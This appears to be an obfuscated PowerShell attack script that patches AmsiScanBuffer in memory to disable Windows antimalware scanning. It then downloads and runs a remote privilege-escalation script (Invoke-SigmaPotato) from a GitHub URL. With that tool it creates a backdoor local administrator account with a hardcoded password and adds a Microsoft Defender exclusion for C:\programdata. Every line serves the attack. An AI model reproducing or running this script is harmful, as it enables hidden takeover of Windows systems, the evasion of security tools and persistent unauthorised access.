#Rasta-mouses Amsi-Scan-Buffer patch \n
$izEIJCxYlpwxxDcFMIs_ = @"
using System;
using System.Runtime.InteropServices;
public class izEIJCxYlpwxxDcFMIs_ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ciCp0Y, string wa03OiS8MXA4LPCi);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr SleD, UIntPtr YkmPx3sHMBwJ, uint uEgVszLnBfd28nsXQuB5, out uint kYb4qY);
}
"@

Add-Type $izEIJCxYlpwxxDcFMIs_

$PaSl1 = [izEIJCxYlpwxxDcFMIs_]::LoadLibrary("$([cHar](97*6/6)+[chAR](43+66)+[CHaR]([byTE]0x73)+[cHAR]([BYtE]0x69)+[ChAr]([ByTe]0x2e)+[chAR](100)+[CHaR]([BYte]0x6c)+[ChaR]([BytE]0x6c))")
$usBNJgg1 = [izEIJCxYlpwxxDcFMIs_]::GetProcAddress($PaSl1, "$(('ÀmsíSc'+'ânBûff'+'êr').nOrmaLizE([CHAR]([ByTE]0x46)+[chaR]([bYTE]0x6f)+[ChAr]([bYte]0x72)+[Char](109*42/42)+[CHAr](68)) -replace [cHAr]([BYTe]0x5c)+[cHar]([Byte]0x70)+[cHaR](95+28)+[chaR](77*64/64)+[chAR](110+25-25)+[ChAR]([bYte]0x7d))")
$p = 0
[izEIJCxYlpwxxDcFMIs_]::VirtualProtect($usBNJgg1, [uint32]5, 0x40, [ref]$p)
$uWnZQV5Sf8LIfz884hmG = "0xB8"
$FIo5_AmulACzNXl = "0x57"
$ljuc7A5 = "0x00"
$wBQMMxl11 = "0x07"
$avzPKqcga = "0x80"
$hZxOvDiwNdv6vweiE6XI = "0xC3"
$lGEue02 = [Byte[]] ($uWnZQV5Sf8LIfz884hmG,$FIo5_AmulACzNXl,$ljuc7A5,$wBQMMxl11,+$avzPKqcga,+$hZxOvDiwNdv6vweiE6XI)
[System.Runtime.InteropServices.Marshal]::Copy($lGEue02, 0, $usBNJgg1, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"



